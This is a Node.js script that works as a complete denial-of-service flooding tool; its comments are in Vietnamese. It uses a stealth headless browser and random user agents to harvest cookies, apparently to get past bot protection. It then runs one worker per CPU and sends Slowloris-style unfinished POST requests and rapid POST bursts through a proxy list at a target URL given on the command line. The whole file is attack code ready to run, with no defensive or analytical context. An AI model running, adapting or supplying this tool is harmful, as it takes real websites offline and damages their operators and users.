const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const randomUseragent = require('random-useragent');
const axios = require('axios');
const fs = require('fs');
const cluster = require('cluster');
const numCPUs = require('os').cpus().length;
const colors = require('colors');

// CONFIG
const TARGET = process.argv[2];
const THREADS = parseInt(process.argv[3]) || numCPUs;
const DURATION = parseInt(process.argv[4]) || 60;
const PROXY_LIST = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(Boolean);

puppeteer.use(StealthPlugin());

async function getSession(proxy) {
  const browser = await puppeteer.launch({
    headless: true,
    args: [
      `--proxy-server=http://${proxy}`,
      '--no-sandbox',
      '--disable-setuid-sandbox'
    ]
  });

  const page = await browser.newPage();
  const ua = randomUseragent.getRandom();
  await page.setUserAgent(ua);
  await page.goto(TARGET, { waitUntil: 'domcontentloaded', timeout: 30000 });

  const cookies = await page.cookies();
  const cookieHeader = cookies.map(c => `${c.name}=${c.value}`).join('; ');

  await browser.close();
  return { cookieHeader, userAgent: ua, proxy };
}

async function flood(session) {
  const [ip, port] = session.proxy.split(':');

  // Gửi POST + Slowloris (không kết thúc request)
  const slowlorisSocket = require('net').createConnection({ host: ip, port: parseInt(port) }, () => {
    slowlorisSocket.write(`POST ${TARGET} HTTP/1.1\r\n`);
    slowlorisSocket.write(`Host: ${TARGET.replace(/https?:\/\//, '')}\r\n`);
    slowlorisSocket.write(`User-Agent: ${session.userAgent}\r\n`);
    slowlorisSocket.write(`Cookie: ${session.cookieHeader}\r\n`);
    slowlorisSocket.write(`Content-Length: 1000000\r\n`);
    // Không kết thúc request, tiếp tục giữ kết nối
  });

  // Axios POST gửi nhanh
  axios.post(TARGET, {
    data: 'burst=' + Math.random()
  }, {
    headers: {
      'User-Agent': session.userAgent,
      'Cookie': session.cookieHeader,
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    proxy: {
      host: ip,
      port: parseInt(port)
    },
    timeout: 5000
  }).catch(() => { });
}

async function start() {
  const proxy = PROXY_LIST[Math.floor(Math.random() * PROXY_LIST.length)];
  try {
    const session = await getSession(proxy);
    console.log(`[✓] Bypass: ${proxy}`.green);
    setInterval(() => flood(session), 500); // Gửi liên tục
  } catch (e) {
    console.log(`[X] Fail Proxy: ${proxy}`.red);
  }
}

if (cluster.isMaster) {
  console.log(`Starting attack on ${TARGET} with ${THREADS} threads for ${DURATION}s`.cyan);
  for (let i = 0; i < THREADS; i++) {
    cluster.fork();
  }

  setTimeout(() => {
    console.log('Attack ended.'.yellow);
    process.exit(0);
  }, DURATION * 1000);
} else {
  (async () => {
    while (true) {
      await start();
    }
  })();
}
